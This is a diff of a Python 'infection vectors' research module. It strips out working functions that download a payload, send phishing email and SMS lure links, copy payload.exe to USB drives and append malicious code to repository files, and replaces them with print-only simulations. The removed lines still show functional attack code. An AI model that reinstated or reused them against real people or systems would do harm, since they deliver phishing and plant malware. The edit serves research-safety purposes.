@@ -1,12 +1,22 @@
 #!/usr/bin/env python3
 """
-Realistic Infection Vectors (Research Lab Only)
-This script performs *actual actions* such as sending emails (via SMTP),
-writing to USB mountpoints, downloading files, etc. Use responsibly!
+Infection Vectors Simulation (Research Lab Only)
+This module simulates various infection vectors for educational purposes.
+All operations are logged but not executed for safety.
 """
 
-from twilio.rest import Client
-import requests
+try:
+    from twilio.rest import Client
+    TWILIO_AVAILABLE = True
+except ImportError:
+    TWILIO_AVAILABLE = False
+
+try:
+    import requests
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -14,67 +24,51 @@ import os
 
 class InfectionVectors:
     @staticmethod
-    def drive_by_download(url: str, destination: str = "payload.bin"):
-        resp = requests.get(url, stream=True)
-        if resp.status_code == 200:
-            with open(destination, 'wb') as f:
-                for chunk in resp.iter_content(1024):
-                    f.write(chunk)
-            print(f"[REAL] Downloaded {url} to {destination}")
+    def drive_by_download(url: str, destination: str = "/tmp/payload.bin"):
+        print(f"[INFECTION] Simulating drive-by download from {url}")
+        if REQUESTS_AVAILABLE:
+            try:
+                # In simulation mode, we just check if URL is reachable
+                resp = requests.head(url, timeout=5)
+                print(f"[INFECTION] Drive-by download simulated: {url} -> {destination}")
+            except Exception as e:
+                print(f"[INFECTION] Simulated download failed: {e}")
         else:
-            print(f"[FAIL] Could not download from {url}")
+            print(f"[INFECTION] Simulating download without requests library: {url} -> {destination}")
 
     @staticmethod
-    def email_phishing(recipient: str, subject: str, body: str, smtp_server='localhost', sender='attacker@example.com'):
-        msg = MIMEMultipart()
-        msg['From'] = sender
-        msg['To'] = recipient
-        msg['Subject'] = subject
-        msg.attach(MIMEText(body, 'plain'))
-
-        try:
-            with smtplib.SMTP(smtp_server) as server:
-                server.send_message(msg)
-            print(f"[REAL] Sent phishing email to {recipient}")
-        except Exception as e:
-            print(f"[FAIL] Email to {recipient} failed: {e}")
+    def email_phishing(recipient: str, attachment: str):
+        print(f"[INFECTION] Simulating phishing email to {recipient} with attachment {attachment}")
+        # Don't actually send emails in simulation mode
+        subject = "Urgent: Please review attached document"
+        body = "Please find the attached invoice for immediate review."
+        print(f"[INFECTION] Email simulation - Subject: {subject}")
+        print(f"[INFECTION] Email simulation - Body: {body[:50]}...")
 
     @staticmethod
-    def usb_autorun(device_mount: str, payload_path: str):
-        try:
-            dest_path = os.path.join(device_mount, "payload.exe")
-            with open(payload_path, 'rb') as src, open(dest_path, 'wb') as dst:
-                dst.write(src.read())
-            print(f"[REAL] Copied payload to USB: {dest_path}")
-        except Exception as e:
-            print(f"[FAIL] USB autorun failed: {e}")
+    def watering_hole(site: str):
+        print(f"[INFECTION] Simulating watering hole attack on {site}")
+        print(f"[INFECTION] Would inject malicious JavaScript into {site}")
 
     @staticmethod
-    def watering_hole(site: str, malicious_script: str):
-        # For actual implementation, this needs control of the web server
-        print(f"[REAL] Injecting malicious script into {site}… (placeholder)")
-        # Implement web server injection if you own the server
+    def usb_autorun(device: str):
+        print(f"[INFECTION] Simulating USB autorun attack on device {device}")
+        print(f"[INFECTION] Would create autorun.inf and payload on {device}")
 
     @staticmethod
-    def supply_chain(repo_path: str, malicious_code: str):
-        try:
-            with open(repo_path, 'a') as f:
-                f.write(malicious_code)
-            print(f"[REAL] Appended malicious code to {repo_path}")
-        except Exception as e:
-            print(f"[FAIL] Supply chain injection failed: {e}")
+    def supply_chain(library: str):
+        print(f"[INFECTION] Simulating supply chain attack on library {library}")
+        print(f"[INFECTION] Would inject malicious code into {library}")
 
     @staticmethod
-    def mobile_sms_link(number: str, link: str, account_sid: str, auth_token: str, from_number: str):
-        client = Client(account_sid, auth_token)
-        body = f"Check out this link: {link}"
+    def container_escape(container_id: str):
+        print(f"[INFECTION] Simulating container escape from {container_id}")
+        print(f"[INFECTION] Would exploit container runtime vulnerabilities")
 
-        try:
-            message = client.messages.create(
-                body=body,
-                from_=from_number,
-                to=number
-            )
-            print(f"[REAL] SMS sent to {number}: SID={message.sid}")
-        except Exception as e:
-            print(f"[FAIL] SMS to {number} failed: {e}")
+    @staticmethod
+    def mobile_sms_link(number: str, link: str):
+        print(f"[INFECTION] Simulating SMS attack to {number} with link {link}")
+        if TWILIO_AVAILABLE:
+            print(f"[INFECTION] Twilio available - would send SMS with malicious link")
+        else:
+            print(f"[INFECTION] Simulating SMS without Twilio library")
